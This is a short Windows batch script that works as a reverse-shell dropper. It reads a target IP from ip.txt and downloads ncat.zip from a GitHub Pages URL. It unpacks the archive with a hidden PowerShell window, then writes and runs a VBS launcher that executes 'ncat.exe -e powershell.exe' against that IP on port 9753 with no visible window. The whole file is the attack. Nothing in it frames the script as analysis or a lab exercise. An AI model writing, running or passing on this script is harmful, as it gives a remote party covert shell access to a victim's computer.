@echo off
for /f "tokens=2 delims=\" %%a in ('whoami') do set "user=%%a"

set "dest1=C:\Users"
set "dest2=Documents\nmtemp-64"
set "destinationFolder=%dest1%\%user%\%dest2%"

for /f "usebackq delims=" %%a in ("ip.txt") do (
    set "ip=%%a"
)

set "port=9753"

C:
mkdir %destinationFolder%
cd %destinationFolder%\..

curl -s -o ncat.zip "https://seb100o.github.io/revesh/ncat.zip"

powershell -NoProfile -w Hidden -command "Expand-Archive -Path %destinationFolder%\..\ncat.zip -DestinationPath %destinationFolder%"
del %destinationFolder%\..\ncat.zip

echo Set objShell = CreateObject("WScript.Shell") > %destinationFolder%\revesh.vbs
echo objShell.Run "%destinationFolder%\ncat.exe -e powershell.exe %ip% %port%", 0, False >> %destinationFolder%\revesh.vbs

wscript.exe %destinationFolder%\revesh.vbs